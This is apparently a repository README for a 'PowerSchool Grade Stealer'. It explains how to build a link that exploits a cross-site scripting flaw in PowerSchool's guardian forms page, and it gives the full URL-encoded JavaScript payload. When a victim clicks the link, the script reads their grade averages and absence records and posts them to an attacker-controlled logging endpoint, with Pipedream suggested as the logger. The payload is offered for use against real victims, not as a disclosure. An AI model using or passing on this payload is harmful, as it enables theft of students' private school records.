# PowerSchool-Grade-Stealer

The script in this repository generates a link for the victim to click on, but it only works on macOS and Linux (if you remove the pbcopy command). A link can be created manually by doing the following:

1. Set up an endpoint URL that logs POST requests to it (can be set up at [Pipedream](https://pipedream.com) by creating an event source).
2. In the following text, replace the text in brackets (and the brackets themselves) with the corresponding information that is described in the brackets:

**[the base URL of the website where PowerSchool is installed]**/guardian/forms.html?sharetype=%22%3Bfunction%20makeHttpObject()%7Btry%7Breturn%20new%20XMLHttpRequest()%7Dcatch(error)%7B%7Dtry%7Breturn%20new%20ActiveXObject(%22Msxml2.XMLHTTP%22)%7Dcatch(error)%7B%7Dtry%7Breturn%20new%20ActiveXObject(%22Microsoft.XMLHTTP%22)%7Dcatch(error)%7B%7Dthrow%20new%20Error(%22Could%20not%20create%20HTTP%20request%20object.%22)%3B%7Dvar%20request%3DmakeHttpObject()%3Brequest.open(%22GET%22%2C%22[**the base URL of the website where PowerSchool is installed]**/guardian/home.html%22%2Ctrue)%3Brequest.send(null)%3Brequest.onreadystatechange%3Dfunction()%7Bif(request.readyState%3D%3D4)console.log(request.responseText)%7D%3B%0A(function()%7B%0A%20%20%20%20var%20oldLog%20%3D%20console.log%3B%0A%20%20%20%20console.log%20%3D%20function%20(message)%20%7B%0A%20%20%20%20%20%20%20%20var%20xhttp%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20%20%20%20%20%20%20xhttp.open(%22POST%22%2C%20%22[**the endpoint's URL]**%22%2C%20true)%3B%0A%20%20%20%20%20%20%20%20xhttp.send(message)%3B%0A%20%20%20%20%20%20%20%20oldLog.apply(console%2C%20arguments)%3B%0A%20%20%20%20%7D%3B%0A%7D)()%3B%0Adocument.body.innerHTML%20=%20%27%27%2F%2F

Note: This only sends the averages of each course and the absences/tardies.
